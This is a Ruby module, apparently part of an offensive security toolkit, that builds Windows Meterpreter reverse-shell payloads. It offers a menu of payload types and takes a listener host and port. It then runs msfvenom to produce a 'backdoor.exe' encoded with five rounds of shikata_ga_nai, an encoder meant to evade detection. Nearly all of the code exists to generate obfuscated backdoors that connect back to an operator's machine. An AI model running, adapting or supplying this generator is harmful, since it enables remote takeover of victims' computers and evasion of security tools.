require 'lib_meta'

class Payloadgen < Poet
  include Lib_meta
  self.mod_name = "Create an executable and rc script"
  self.description = "Create and obfuscate payloads using msfvenom."
  self.title = 'Payload generation'

  def initialize
    t = Time.now
    @log = Menu.opts[:log]
    
    puts "\n#{self.class.description}"

    payloads = {
      1 => 'windows/meterpreter/reverse_http',
      2 => 'windows/meterpreter/reverse_https',
      3 => 'windows/meterpreter/reverse_tcp',
      4 => 'windows/meterpreter/reverse_tcp_dns',
      5 => 'Other Windows Payload',
    }

    payloads.each { |x,y|
      puts "    #{x}) #{y}"
    }
    puts

    lhost, lport = '',''

    selection = ''
    until (1..payloads.length).member?(selection.to_i)
      print "Select payload [#{color_banner('1')}] : "
      selection = rgets
      selection = 1 if selection.empty?
    end
    payload = payloads[selection.to_i]
    puts

    if payload =~ /^windows\//
      if payload.eql? 'windows/meterpreter/reverse_tcp_dns'
        lhost, lport = get_meter_data(true)
      else
        lhost, lport = get_meter_data
      end
      final_payload, payload_hash = build_payload_msfvenom(payload, lhost, lport)
      rc = create_rc(payload, lhost, lport)
      
    elsif payload =~ /^Other Windows/
      win_payload = ''
      while win_payload.empty?
        print("Enter a windows payload to use: ")
        win_payload = rgets.downcase
      end
      lhost, lport = get_meter_data
      final_payload, payload_hash = build_payload_msfvenom(win_payload, lhost, lport)
      rc = create_rc(win_payload, lhost, lport)
    end

    puts "\nPress enter to Return to Exploitation Menu"
    gets
  end

  def build_payload_msfvenom(payload, lhost, lport)
    print_status("Building payload with msfvenom...")
    
    payload_path = "#{@log}/backdoor.exe"
    
    # Use msfvenom with multiple iterations of shikata_ga_nai for basic obfuscation
    msfcmd = "msfvenom -p #{payload} LHOST=#{lhost} LPORT=#{lport} -f exe -o #{payload_path} "
    msfcmd << "-e x86/shikata_ga_nai -i 5"
    
    print_status("Executing: #{msfcmd}")
    system(msfcmd)
    
    if File.exist?(payload_path)
      print_good("Payload compiled: #{payload_path}")
      # Get SHA1 hash
      require 'digest'
      payload_hash = Digest::SHA1.hexdigest(File.read(payload_path))
      return payload_path, payload_hash
    else
      print_bad("Could not compile binary with msfvenom...")
      return nil, nil
    end
  end
end
